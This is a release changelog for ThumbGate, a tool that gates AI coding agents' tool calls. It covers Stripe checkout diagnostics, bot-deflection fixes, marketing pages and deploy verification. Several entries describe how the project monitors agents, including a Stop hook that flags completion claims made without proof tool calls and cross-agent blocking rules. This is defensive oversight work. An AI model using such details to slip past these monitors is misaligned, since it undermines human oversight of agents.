- [#2099](https://github.com/IgorGanapolsky/ThumbGate/pull/2099) [`920f571`](https://github.com/IgorGanapolsky/ThumbGate/commit/920f571ad2f4fdd082623c371acb464193c73f35) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - README + LAUNCH_POSTS docs honesty pass triggered by [r/ClaudeCode comment thread](https://www.reddit.com/r/ClaudeCode/comments/1tc2k1z/comment/oll1dua/). Three corrections:

  1. **"No LLM in enforcement" needs the qualifier.** Layer 2 description now distinguishes the deterministic runtime gate decision (literal pattern + AST + scoped lookup, zero LLM) from offline retrieval (local CPU-only `bge-small` embeddings via LanceDB — a model, but no external API call and no inference cost beyond CPU).
  2. **Thompson Sampling does NOT select rules.** Old framing said "Thompson Sampling for adaptive rule selection" / "multi-armed bandit rule selection" which implied the bandit decides whether a rule fires. Corrected: TS tunes per-rule confidence weights for soft-gating rules. Hard rules ("block force-push to main") always fire deterministically — bandit exploration would be terrifying for hard rules.
  3. **Cross-agent propagation + learning loop is the lead differentiator vs hand-rolled hooks.** Layer 4 description now explicitly answers "why ThumbGate over Claude Code's `permissions.deny` or a custom `PreToolUse` script": (a) checks propagate cross-agent over MCP — thumbs-down on Cursor blocks the same pattern on Claude Code, Codex, Gemini in the next session; (b) every feedback event becomes a fresh rule and tunes existing ones, so the corpus sharpens without an operator hand-writing patterns for every new mistake shape.

- [#2101](https://github.com/IgorGanapolsky/ThumbGate/pull/2101) [`6a145b7`](https://github.com/IgorGanapolsky/ThumbGate/commit/6a145b737b073091bf47e6b125d201bb2264c7ba) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix broken README hero line. The README has shown `**Stop paying $ for the same AI mistake.**` since 2026-04-26 — a stray `$` placeholder that was never filled in. The canonical product line elsewhere on the site is `Stop paying for the same AI mistake twice` (matches `<title>` tag on the homepage). This PR aligns the README hero to that exact phrasing.

  Caught by a self-critique pass during a bug-hunt session. The placeholder had been live on the public GitHub README for almost three weeks.

- [#2161](https://github.com/IgorGanapolsky/ThumbGate/pull/2161) [`d3e2c67`](https://github.com/IgorGanapolsky/ThumbGate/commit/d3e2c6738f88be4254ba01fb522ff3f6b97aaba4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Regulated-industries reframe — riding the GitLab/New Stack build-vs-buy thesis into a higher-ACV ICP.

  **Trigger:** GitLab Field CTO Bryan Ross published "[The hidden cost of build vs. buy for agentic AI in regulated industries](https://thenewstack.io/agentic-ai-build-buy/)" in The New Stack on 2026-05-15, putting a $1.4M / 18-month price tag on DIY agentic AI platforms. The piece names the orchestration layer as the real complexity but does not name the execution-boundary layer underneath. That gap is ThumbGate.

  **Shipped in this PR:**

  - **New learn article** `/learn/regulated-agent-execution-boundary` — companion piece citing Ross's article, extending the build-vs-buy frame to the execution-boundary layer. SEO-targeted at DORA / EU AI Act / "agentic AI build vs buy" / "agent execution boundary" queries. Linked from `learn.html` at the top of the article grid.
  - **Regulated pricing tier** on `/` — full-width card below the existing 3-tier grid (Free / Pro / Team). Contact-sales surface, not self-serve, with workflow-scoped pricing anchor ($4,800/mo + $7,500 sprint) and DORA/EU AI Act evidence packaging language. Targets banking, insurance, healthcare, public sector. Posthog + first-party telemetry events wired for `regulated_intake_started`.
  - **Outreach draft** `reports/outreach/bryan-ross-gitlab-2026-05-18.md` — LinkedIn + email + public-comment variants for warm outreach to Bryan Ross. Citation-anchored, partnership/integration angle, no pitch. CEO approval required before send per `CLAUDE.md` outbound directive.
  - **Sales anchor library** `docs/marketing/sales-anchors-2026-05.md` — reusable copy snippets for the $1.4M anchor across LinkedIn, email, Reddit, and discovery calls, with ICP gating signals and a 6-month half-life on the citation.

  **ROI thesis:** Pro at $19/mo is the right wedge for solo devs and small consultancies. Regulated at $4,800/mo is a 250× ACV step for buyers with audit pressure. Even a single Regulated close at the floor price exceeds the entire Pro pipeline target for the quarter. The companion piece is also a backlink and SEO play against terms ("agentic AI build vs buy", "DORA agent compliance") with no existing competitor content.

  No existing tests broken. Pricing grid still asserts 3 self-serve tiers; the Regulated card is structurally outside the grid and does not interfere with `pricing page is the single source of truth` assertions.

- [#2267](https://github.com/IgorGanapolsky/ThumbGate/pull/2267) [`ff9adf9`](https://github.com/IgorGanapolsky/ThumbGate/commit/ff9adf923c900d8b044e9f181d805666672a6f4a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Revert the graceful shutdown listener cleanup after production verification showed the cleanup path could leave Railway without a healthy running container.

- [#2243](https://github.com/IgorGanapolsky/ThumbGate/pull/2243) [`f52ef0b`](https://github.com/IgorGanapolsky/ThumbGate/commit/f52ef0b6db435c7ef41869d865040ae01303bd10) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix workflow sentinel to checkpoint (warn) background customer-system actions before hard-deny threshold. Previously, risk drivers from background agent + customer system action could push the score past 0.86, triggering a hard deny that blocked legitimate automated workflows.

- [#2258](https://github.com/IgorGanapolsky/ThumbGate/pull/2258) [`689b215`](https://github.com/IgorGanapolsky/ThumbGate/commit/689b215bd3c7b030a963c3a41b284a843c735d8f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Soften public-facing Cursor Marketplace claims while the listing is still in review.

  The Cursor Marketplace submission was filed 2026-05-19 via `cursor.com/marketplace/publish`, but Cursor has not yet completed manual review and `cursor.com/marketplace/thumbgate` currently returns 404. Public marketing copy was implying the plugin is already live on the Marketplace, which could mislead visitors. The runtime install path (`npx thumbgate init --agent cursor`) works today and is unaffected — only the Marketplace LISTING is pending.

  Files softened:

  1. **`public/index.html`** — the "🎯 Cursor plugin" compat card (line ~931) gained a "(Marketplace review pending)" suffix and the body now explicitly states the runtime install works today via `npx thumbgate init --agent cursor` while the Marketplace listing is awaiting Cursor's manual review. The "What AI agents and editors does this work with?" FAQ (line ~1411) was updated for the same nuance — Cursor plugin bundle installs today via the npx command, in-app Marketplace discoverability is pending.

  2. **`public/agent-manager.html`** — the Plugin marketplace row in the ICP mapping table (line 79) now annotates "Cursor extension" with the review-pending status and the working runtime install path.

  3. **`public/llm-context.md`** — the Plugin marketplace bullet under the Agent Manager section (line 241) was softened with the same annotation so AI crawlers and LLM context surfaces don't quote the optimistic version.

  4. **`docs/CURSOR_PLUGIN_OPERATIONS.md`** — added a Positioning rules bullet codifying the "Marketplace listing pending Cursor's review" wording requirement so future copy edits stay honest until Cursor approves. The runtime install path (`npx thumbgate init --agent cursor`) remains the safe-to-promote install path.

  Auto-generated revenue-pack files (`docs/marketing/cursor-marketplace-revenue-pack.{md,json}`) were intentionally NOT hand-edited — they regenerate from `scripts/cursor-marketplace-revenue-pack.js --write-docs`.

- [#2085](https://github.com/IgorGanapolsky/ThumbGate/pull/2085) [`460e254`](https://github.com/IgorGanapolsky/ThumbGate/commit/460e25459fba5f86f9c039b82e86885903399f41) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Ship `/learn/spec-driven-development` — landing page positioning ThumbGate as the runtime enforcement layer for spec-driven development. The spec-driven workflow (mission.md / tech-stack.md / roadmap.md constitution plus per-feature plan / requirements / validation) is rising as an alternative to vibe coding, but the spec only works if the agent cannot drift outside it. Page makes that gap explicit and positions ThumbGate as the "bailiff" enforcing the spec at the PreToolUse hook layer.

  SEO angle: "spec-driven development" + "AI agent spec enforcement" are growing search terms with low competition for the enforcement-layer framing.

- [#2156](https://github.com/IgorGanapolsky/ThumbGate/pull/2156) [`d9e35c5`](https://github.com/IgorGanapolsky/ThumbGate/commit/d9e35c50820440962ae8fa3a4a089ba75681e251) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix: natural Workflow Hardening Sprint URLs (`/sprint`, `/workflow-hardening`, `/workflow-hardening-sprint`, `/workflow-sprint`, and `.html` variants) now 302-redirect to the canonical `/#workflow-sprint-intake` anchor instead of returning a hostile JSON 401 (`urn:thumbgate:error:unauthorized`).

  Recipients of outbound messages mentioning "the workflow hardening sprint" who typed the natural URL were being silently bounced. Live probe on 2026-05-18 confirmed the 401 response on all four URL variants on production.

  Mirrors the existing `/services` → `/#workflow-sprint-intake` redirect pattern. 8 new redirect assertions added to `tests/public-static-assets.test.js`.

- [#2100](https://github.com/IgorGanapolsky/ThumbGate/pull/2100) [`f92d3c5`](https://github.com/IgorGanapolsky/ThumbGate/commit/f92d3c58e0706b4c96d82f29915aa5fcf7271f9a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `scripts/stripe-business-identity-probe.js` — what does the buyer actually see on the Stripe-hosted checkout page?

  The stripe-checkout-diagnostic from PR [#2097](https://github.com/IgorGanapolsky/ThumbGate/issues/2097) revealed the failure mode is buyer-bail-at-Stripe-page (100 sessions, 100% open/expired, 100% no customer email, zero payment*intent errors). That means buyers are seeing something on the Stripe page in the first 3 seconds that makes them close the tab. The diagnostic doesn't pull the \_identity surface* — what name/logo/description/statement_descriptor the merchant actually has configured. This probe does.

  Pulls every Stripe-side field that contributes to brand recognition on the checkout page:

  - `account.business_profile.{name, url, support_email, product_description, mcc}` — buyer-facing merchant identity
  - `account.settings.payments.statement_descriptor` — what shows on the card statement after purchase
  - `account.settings.card_payments.statement_descriptor_prefix`
  - `account.settings.branding.{logo, icon, primary_color, secondary_color}` — visual continuity from thumbgate.ai → Stripe page
  - `paymentLinks.list` per-link config: `active`, `submit_type`, `billing_address_collection`, `phone_number_collection`, custom_text presence, metadata keys
  - Diagnoses each missing field as `critical` / `warning` / `info` with a specific message about what the buyer will see (or not see) as a result.

  Wired into the Daily Revenue Loop workflow as a new step between unified-rollup and external-customer-audit. Outputs markdown + JSON to `reports/revenue/stripe-business-identity.*` plus a GitHub Actions job-summary section.

  12 unit tests cover identity field extraction (with and without business_profile / branding / payments / card_payments sections), gap diagnosis (critical on missing name, warning when name doesn't contain "ThumbGate", info on missing URL / support_email), Payment Link summary extraction, Payment Link gap diagnosis (critical on inactive Payment Link still on file, warning on phone-collection friction), the runProbe end-to-end happy path, and unconfigured-Stripe degradation.

- [#2097](https://github.com/IgorGanapolsky/ThumbGate/pull/2097) [`ef92c9d`](https://github.com/IgorGanapolsky/ThumbGate/commit/ef92c9d19d448d4c4ad63e421b32c68607813880) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `scripts/stripe-checkout-diagnostic.js` — answers the question raised by the external-customer-audit (PR [#2095](https://github.com/IgorGanapolsky/ThumbGate/issues/2095)): WHY are 1000 lifetime checkout sessions producing 0 completed payments? The unified rollup reports the count but not the cause. This script pulls real Stripe API data for the cause.

  Diagnostic surface:

  1. Checkout session terminal-status breakdown (complete / expired / open / ...) plus payment_status distribution.
  2. PaymentIntent `last_payment_error` rollup by code, type, and decline_code — distinguishes "buyer abandoned at email step" from "card declined" from "fraud rule fired."
  3. Stripe Account health: `details_submitted`, `charges_enabled`, `payouts_enabled`, `requirements.disabled_reason`, `currently_due`, `past_due`, `pending_verification` arrays — the explicit fields blocking the account from normal processing.
  4. Webhook endpoint inventory — flags the perception-risk case where checkouts complete on Stripe but our local ledger never sees them because no webhook is wired.
  5. Recent-20-sessions table with cross-linked payment_intent error data so the operator can see the most recent failure modes in one view.

  The markdown report includes a top-to-bottom diagnosis ranking: if `charges_enabled = false` it names that as the binding blocker before anything else; if zero payment intents have errors but many sessions exist, it names buyer abandonment as the diagnosis; if no webhooks are configured, it warns that "0 completions" may be undercounted.

  Wired into the Daily Revenue Loop workflow alongside the unified rollup and the external-customer audit. Outputs both markdown and JSON to `reports/revenue/stripe-checkout-diagnostic.*` and a GitHub job-summary section.

  9 unit tests with an injected fake Stripe client cover argument parsing, status / payment-status / error-code bucketing, the binding-blocker diagnosis path, the missing-webhook flag, recent-sessions table rendering with PI error codes, and the uniform-abandonment-without-errors diagnosis.

- [#2073](https://github.com/IgorGanapolsky/ThumbGate/pull/2073) [`8d61192`](https://github.com/IgorGanapolsky/ThumbGate/commit/8d61192b76d2540b96684cba55f41a5478504d32) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Swap the 5 hardcoded `buy.stripe.com/*` URLs in `src/api/server.js` to the new Payment Links generated by today's catalog-bootstrap dispatch (run 25883541719). The previous links resolved to ad-hoc Stripe-created products with no consistent naming; the new ones are wired to the persistent ThumbGate-branded products (`metadata.thumbgate_tier=*`) with per-tier thumbnails, so buyers landing on the Stripe page now see "ThumbGate — Workflow Sprint" with the ThumbGate icon instead of an unbranded $1,500 line item.

- [#2092](https://github.com/IgorGanapolsky/ThumbGate/pull/2092) [`2f89fd6`](https://github.com/IgorGanapolsky/ThumbGate/commit/2f89fd6ff0cbdd1980720f3d756e995b0bef2544) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `GET /v1/telemetry/export` — operator-key-gated endpoint that returns recent raw telemetry-pings + funnel-events rows so the Daily Revenue Loop CI can pull first-party event data off the Railway container and join CTA-click attribution into the unified revenue rollup. Closes the third gap surfaced in the 2026-05-15 audit (Plausible reports pageview→pageview, Stripe reports charges, but the pageview→CTA-click handoff lives in `.thumbgate/telemetry-pings.jsonl` on Railway with no export path).

  Endpoint contract:

  - Auth: `THUMBGATE_OPERATOR_KEY` or the admin `THUMBGATE_API_KEY` (same auth shape as `/v1/billing/summary`).
  - Query params: `since` (ISO8601, default last 24h), `limit` (default 1000, hard cap 10000), `source` (`telemetry` | `funnel` | `both`, default `both`).
  - Returns `{ generatedAt, since, limit, source, telemetry: { rows, truncated, totalAfterSince }, funnel: { rows, truncated, totalAfterSince } }`.
  - Truncation keeps the MOST RECENT rows (slice(-limit)) and signals via `truncated: true`.
  - Graceful: missing JSONL files return `rows: []`, never a crash.

  12 integration tests cover both auth paths, both rejection paths, every query parameter, the since-window filter, the truncation behavior, the hard-cap clamp, the negative-limit fallback, and the stable response schema.

- [#2090](https://github.com/IgorGanapolsky/ThumbGate/pull/2090) [`7e0e77d`](https://github.com/IgorGanapolsky/ThumbGate/commit/7e0e77d261cc986224e2342871cae69bcb89baa5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `scripts/unified-revenue-rollup.js` — single script that joins Stripe live status (cash, MRR, lifetime revenue, checkout completion) with Plausible web analytics (visitors, pageviews, traffic sources) and projects the join onto the seven public revenue surfaces (`/`, `/pricing`, `/case-studies`, `/compare/heidi`, `/learn/spec-driven-development`, `/pro`, `/go/teams`).

  Closes the audit gap surfaced on 2026-05-15 where the previous `revenue-status.js` only did a binary "is Plausible installed on the page" check and `analytics-latest.md` had gone two days stale. The new rollup is wired into the Daily Revenue Loop workflow (`.github/workflows/daily-revenue-loop.yml`) so a fresh `reports/revenue/unified-rollup-latest.md` is produced every run, and the markdown is also surfaced into the GitHub Actions job summary for at-a-glance review.

  The script degrades gracefully when STRIPE_SECRET_KEY or PLAUSIBLE_API_KEY are missing — every absence becomes a labelled gap line, never a crash — so the same script is safe to run locally or in CI with partial secrets.

  Diagnostics flag "funnel leak" patterns: traffic-on-/pricing-with-$0-balance and traffic-on-/case-studies-with-zero-checkouts. These are info-level signals, not warnings — they describe state, they do not claim revenue.

  14 tests cover: surface list completeness, arg parsing, Plausible-page-to-surface join with zero-fill, diagnostics-firing-rules, markdown rendering (positive and degraded paths), and the gather/build wiring with a fake Plausible API + injected stripe-live-status module.

- [#1977](https://github.com/IgorGanapolsky/ThumbGate/pull/1977) [`0bf50bc`](https://github.com/IgorGanapolsky/ThumbGate/commit/0bf50bc58b5c8e5f1aed7816f8a3f2e66f54bc68) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `.github/workflows/verify-deploy-comment.yml` which runs after the `Deploy to Railway` workflow finishes for `main` pushes. It polls `/health` for up to 8 minutes waiting for the production `buildSha` to match the merge commit, probes `/`, `/health`, `/dashboard`, and every newly added `public/learn/*.html` or `public/guides/*.html` route in the merge diff, then posts a single comment back on the PR that introduced the merge — with the buildSha match, the `/health` JSON snapshot, and the per-route HTTP codes. Codifies the CLAUDE.md deployment-verification gate (no claiming "deployed" without `/health` evidence) as automation rather than a human checklist.

- [#2089](https://github.com/IgorGanapolsky/ThumbGate/pull/2089) [`ac34782`](https://github.com/IgorGanapolsky/ThumbGate/commit/ac347828825bfad4e96d7a135ba497cb4210dc5c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Wire `/pricing` and `/case-studies` into the homepage top-nav so buyers landing on `thumbgate.ai` can reach the canonical pricing and proof surfaces in one click. Previously the "Pricing" link pointed to an in-page anchor (`#pricing`) — the dedicated `/pricing` page shipped in PR [#2068](https://github.com/IgorGanapolsky/ThumbGate/issues/2068) was reachable only via direct URL. `/case-studies` (PR [#2067](https://github.com/IgorGanapolsky/ThumbGate/issues/2067), currently Aiventyx-only) had no entry at all.

- [#2147](https://github.com/IgorGanapolsky/ThumbGate/pull/2147) [`a7dc07c`](https://github.com/IgorGanapolsky/ThumbGate/commit/a7dc07cd8e1a41d9a023572d31354a714ec1c513) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bumps `ws` from 8.20.0 to 8.20.1 (Dependabot). Patch-level transport-layer dep used by the local MCP stdio server. No public API changes.

- [#2170](https://github.com/IgorGanapolsky/ThumbGate/pull/2170) [`75eba2a`](https://github.com/IgorGanapolsky/ThumbGate/commit/75eba2a46ad1ccdc7e0ad3cb883f38b320b41ecb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - **Stops the source of the 2,251 zombie Stripe checkout sessions** surfaced by the 2026-05-19 diagnostic (98.2% expired, 0 email captured, $147 amounts).

  Root cause was two independent leaks creating sessions on every visit:

  1. **`public/index.html:1299`** — the "Start 3-seat Team — $147/mo" landing-page link hardcoded `&confirm=1` in the URL. Every crawler that hit the landing page followed this link → `/checkout/pro?confirm=1` → live Stripe `cs_live_*` session creation. Matches the `$147` amount on most expired sessions in the diagnostic. Fix: drop `confirm=1` from the link. Crawlers + humans now land on the interstitial (same flow as the $19 Pro path).

  2. **`scripts/revenue-observability-doctor.js:84`** — the prod healthcheck GETs `/checkout/pro?confirm=1` to verify the redirect contract. Daily-revenue-loop cron runs this script. Each tick = one zombie session. Fix: drop the confirm-path probe; the interstitial-body check on `/checkout/pro` already proves the deflection is live, and the post-deflection confirm path is covered by `checkout-bot-guard` integration tests.

  Doctor return shape preserved (`result.confirm.status / redirects / location`) for downstream consumers; values are now `null` and `probeDisabled: true` flag set. Test rewritten with a regression guard: throws if any future fetch from the doctor includes `confirm=1`.

  5/5 doctor tests pass. Public-landing tests pass.

- [#2181](https://github.com/IgorGanapolsky/ThumbGate/pull/2181) [`2ca74a0`](https://github.com/IgorGanapolsky/ThumbGate/commit/2ca74a0a9ae788d650afd60d9e64bd894c6f87d2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Stop bots from burning `cs_live_*` Stripe sessions by following the `confirm=1` link inside the checkout interstitial.

  2026-05-19 audit found 2,210 of 2,251 lifetime Stripe Checkout sessions (98%) were zombies — expired, no email, no payment attempt. Root cause: the interstitial HTML renders a `<a href="/checkout/pro?confirm=1...">` link for the "Pay $19/mo with Stripe →" CTA, and bot crawlers discovered/followed it, bypassing the bot-deflection check on raw GETs and triggering Stripe session creation per crawl.

  Two-layer fix:

  1. **Server-side:** bot UA + `confirm=1` (alone) no longer treated as confirmed checkout — deflects back to the interstitial. POST requests still proceed (form submissions). A `customer_email` query param also bypasses the bot check, because no real crawler fabricates customer emails on discovered URLs.

  2. **HTML-side:** the confirm link in the interstitial now carries `rel="nofollow noindex"` so well-behaved crawlers (Google, Bing, ClaudeBot, GPTBot) stop following it in the first place.

  Expected outcome: 30d Stripe session count should drop from ~250 zombies/mo to humans-only volume.

## 1.21.2

### Patch Changes

- Publish the Claude Code init/statusline fix from #2233: `thumbgate init` now detects Claude Code through the canonical hook installer, hook-runtime fast paths preserve explicit subcommands such as `statusline-render`, `thumbgate --version` works, and the default Claude statusline stays compact with dashboard, lesson, branch, and PR details behind `THUMBGATE_STATUSLINE_VERBOSE=1`.

## 1.19.0

### Minor Changes

- [#1982](https://github.com/IgorGanapolsky/ThumbGate/pull/1982) [`994fa11`](https://github.com/IgorGanapolsky/ThumbGate/commit/994fa11635b8450890bbb79446dc4dfaef8dab23) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add AI deployment readiness positioning, SEO guide, and sprint conversion surfaces for production agent rollout buyers.

- [#1936](https://github.com/IgorGanapolsky/ThumbGate/pull/1936) [`1d9786a`](https://github.com/IgorGanapolsky/ThumbGate/commit/1d9786a48e2cf81134aa1f7d336d4a9aa94f643c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a Branch Contamination Guard (workflow + `scripts/audit-pr-bot-contamination.js`) that fails fast when a PR contains commits authored by the bare `actions@github.com` identity (NOT the registered `github-actions[bot]`) that drop > 100 lines of new files onto a non-automation branch. Catches the failure mode that turned PR [#1910](https://github.com/IgorGanapolsky/ThumbGate/issues/1910) (a 21-line `/go/teams` redirector fix) into a 4-hour pipeline grind: a 693-line `scripts/feedback_quality_eval.py` got committed onto its branch by off-script tooling and tanked SonarCloud's coverage gate (9% on new code). Skips audit cleanly on automation-owned branches (`auto/`, `agent/`, `claude/`, `codex/`, `dependabot/`, `renovate/`). 7 regression tests including one that re-plays the actual `bee4938a` commit.

- [#1989](https://github.com/IgorGanapolsky/ThumbGate/pull/1989) [`e87299d`](https://github.com/IgorGanapolsky/ThumbGate/commit/e87299de1bb748370fecc330ee67acea2675faff) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Eliminate zombie Stripe sessions: render the `/checkout/pro` interstitial for every non-confirmed GET (bot OR human), not only bot traffic. Before this change a raw GET on `/checkout/pro` 302'd straight to a fresh `cs_live_*` Stripe session — which is what created the 50-zombie-sessions / 0-paid pattern surfaced 2026-05-13 (every crawler, every link-preview fetcher, every confused human GET generated a real Stripe session before any context, email, or button click). After: only `POST` or `?confirm=1` creates a Stripe session. Humans clicking the "Pay $19/mo with Stripe →" button on the interstitial supply `confirm=1` on the next hop, so the conversion path is preserved — they just see what they're paying for before Stripe asks for the card. Telemetry change: when the visitor is not bot-classified, the event fires as `checkout_interstitial_view` instead of `checkout_bot_deflected`, so funnel reports can distinguish bot deflection from intentional human views.

- [#1982](https://github.com/IgorGanapolsky/ThumbGate/pull/1982) [`994fa11`](https://github.com/IgorGanapolsky/ThumbGate/commit/994fa11635b8450890bbb79446dc4dfaef8dab23) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add tokenizer-brittleness model benchmarking for byte-level robustness across malformed JSONL, Unicode confusables, stack traces, SQL, secrets, paths, and code-symbol-heavy inputs.

- [#1972](https://github.com/IgorGanapolsky/ThumbGate/pull/1972) [`a4a1267`](https://github.com/IgorGanapolsky/ThumbGate/commit/a4a12670a70a918dcb840dab4a5654ae32e3ff95) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add federal agency positioning surface (`docs/FEDERAL.md`, `public/federal.html`, `/federal` route) so SBIR / agency / SI evaluators land on a dedicated page rather than the developer-focused home page. Page is pilot-ready posture only — no FedRAMP claim, no speculative compliance badges. The technical brief maps existing ThumbGate capabilities to NIST 800-53 Rev 5 controls (AC-3, AC-6, AU-2/3/12, CM-3, CM-7, IR-4, RA-5, SI-4, SI-7) and to OMB M-24-10 / EO 14110 inventory and risk-management requirements; defines a two-profile deployment model (public open source unchanged, `THUMBGATE_DEPLOY=gov` mode in ThumbGate-Core for on-prem / GovCloud / Azure Government installs); pins five architectural invariants protecting the developer install path. Two new regression tests added to `tests/public-core-boundary.test.js`: federal lead-gen files must exist, and federal behavior must gate on `THUMBGATE_DEPLOY=gov` only (no env-var sprawl). Route accepts `/federal`, `/federal.html`, `/government`, `/gov` and flows through `servePublicMarketingPage` for UTM attribution on agency arrivals.

- [#1884](https://github.com/IgorGanapolsky/ThumbGate/pull/1884) [`a46b371`](https://github.com/IgorGanapolsky/ThumbGate/commit/a46b3718d73c24618cc774f81dff9ecda891022b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - `/health` and `/healthz` no longer return `status: 'ok'` unconditionally. Each endpoint now probes the relevant downstream subsystem and returns HTTP 503 + `status: 'degraded'` with a per-check breakdown when any probe fails. `/health` verifies feedback-dir writability, hosted-config app-origin, and build-metadata SHA presence. `/healthz` verifies feedback-log + memory-log directories are writable. Backward-compatible payload shape: existing fields preserved, `checks: {}` added. Uptime monitors now detect real service degradation instead of just process liveness.

- [#1981](https://github.com/IgorGanapolsky/ThumbGate/pull/1981) [`d3d3257`](https://github.com/IgorGanapolsky/ThumbGate/commit/d3d32572fb544ac07cf0d26deac41136057162d2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Ship the high-ROI bundle from the 2026-05-13 revenue-ROI critique. Four code-side improvements ranked by revenue ROI, plus one positioning doc:

  - **[#4](https://github.com/IgorGanapolsky/ThumbGate/issues/4) Deploy-verification GitHub Action** (`.github/workflows/deploy-verify.yml`) — triggers on push to main, waits 180s for Railway rebuild, curls `/health` for expected version, curls `/dashboard` for sentinel string, samples any `public/learn|guides|compare/*.html` routes added in the diff, posts a green/red comment on the merging PR. Ends the recurring "did it actually deploy?" trust-burn pattern. The Deployment Verification Gate from CLAUDE.md was manual; now it's automated.

  - **[#2](https://github.com/IgorGanapolsky/ThumbGate/issues/2) Plausible custom funnel events** (`scripts/plausible-server-events.js` + 3 server-side fires in `src/api/server.js`) — emits `Checkout Pro Viewed` / `Checkout Pro Email Submitted` / `Checkout Pro Stripe Redirect Started` to the Plausible events API alongside the existing JSONL telemetry. Fire-and-forget, 2s timeout, opt-out via `THUMBGATE_PLAUSIBLE_DISABLE=1` or `DO_NOT_TRACK=1`. Closes the "0/50 checkouts and we don't know why" visibility gap — the three transitions now show up in the same dashboard where pageviews already live, exposing exactly where the funnel drops (landing → email → Stripe → paid).

  - **[#1](https://github.com/IgorGanapolsky/ThumbGate/issues/1) Activation telemetry** (`scripts/activation-tracker.js` + hook in `scripts/feedback-loop.js`) — anonymous `activation_first_rule_promoted` ping the first time a prevention rule auto-promotes for an install. Payload: `installId` + `daysToFirstRule` + `visitorType` (ci|owner|real_user) + `promotionCount` + `totalGates`. Idempotent via marker file under `~/.thumbgate/activation/`. Critical metric for the v1.17.0 free-tier-opening experiment: % of `npx thumbgate init` runs that produce a first auto-promoted rule within 24h. Respects existing telemetry opt-outs.

  - **[#5](https://github.com/IgorGanapolsky/ThumbGate/issues/5) Anti-claim Stop hook** (`scripts/hook-stop-anti-claim.js` registered in `.claude/settings.json`) — scans the assistant's most recent turn for completion-claim wording ("is live", "deployed", "fixed", "ready", "shipped"). If the same turn lacks a proof tool call (`curl`, `gh pr view`, `gh api`, `npm test`, `node --test`, `Bash(...)`, `Read(...)`), prints a system reminder for the next turn. ThumbGate-on-ThumbGate dogfood — the harness now enforces the anti-lying directive that CLAUDE.md asks for but didn't enforce. Informational (never hard-blocks), so the agent corrects mid-conversation rather than losing the turn.

  - **Databricks positioning brief** (`docs/DATABRICKS.md`) — composition map showing how ThumbGate composes with MLflow / Unity Catalog / Mosaic AI / Vector Search without claiming integration. Cheap pre-LOI artifact so "they call out Databricks exposure" RFP / recruiter conversations have a credible answer. Same pulled-by-demand sequencing as `docs/FEDERAL.md`.

  New tests: `tests/plausible-server-events.test.js` (10), `tests/activation-tracker.test.js` (5), `tests/hook-stop-anti-claim.test.js` (10). All pass locally.

- [#1982](https://github.com/IgorGanapolsky/ThumbGate/pull/1982) [`994fa11`](https://github.com/IgorGanapolsky/ThumbGate/commit/994fa11635b8450890bbb79446dc4dfaef8dab23) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add an interaction-model runtime layer with normalized event JSONL, replayable workflow state, foreground claim gates, and background verification recommendations.

- [#2062](https://github.com/IgorGanapolsky/ThumbGate/pull/2062) [`7e3bbff`](https://github.com/IgorGanapolsky/ThumbGate/commit/7e3bbff524941cd839df6d5978dbb7b0d95fb2d0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - refactor(python): elevate Thompson feedback logic with OOP and pytest. Migrates the Bayesian reliability model to use Python dataclasses and adds a comprehensive \`pytest\` suite.

- [#1919](https://github.com/IgorGanapolsky/ThumbGate/pull/1919) [`aba7c4e`](https://github.com/IgorGanapolsky/ThumbGate/commit/aba7c4e4be8bba6d2600142176f8b482fd9807af) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `scripts/stripe-bootstrap-saas-catalog.js` + dispatch workflow that idempotently creates the **full ThumbGate paid catalog** in Stripe Live: persistent `ThumbGate Pro` / `Team` / `Free` SaaS products plus the 5 one-off SKUs currently sold via hardcoded `buy.stripe.com` URLs in `src/api/server.js` (`First Failure Rule` $1, `Quick Read` $19, `Workflow Teardown` $99, `Sprint Diagnostic` $499, `Workflow Sprint` $1,500). Each one-off also gets an auto-generated Payment Link (active=true, `metadata.thumbgate_lookup_key` keyed for idempotency), and the workflow summary prints the new `buy.stripe.com/...` URLs so a follow-up PR can swap the hardcoded constants in `server.js`. Why: the dashboard Product Catalog currently shows only legacy consulting SKUs — no ThumbGate-branded rows — which blocks the Stripe Customer Portal plan-switcher and prevents Payment Links from sitting on stable prices. Keyed by `metadata.thumbgate_tier` + lookup_keys; re-runs converge. Workflow is `workflow_dispatch`-only with a `dry_run` input that defaults to `true`.

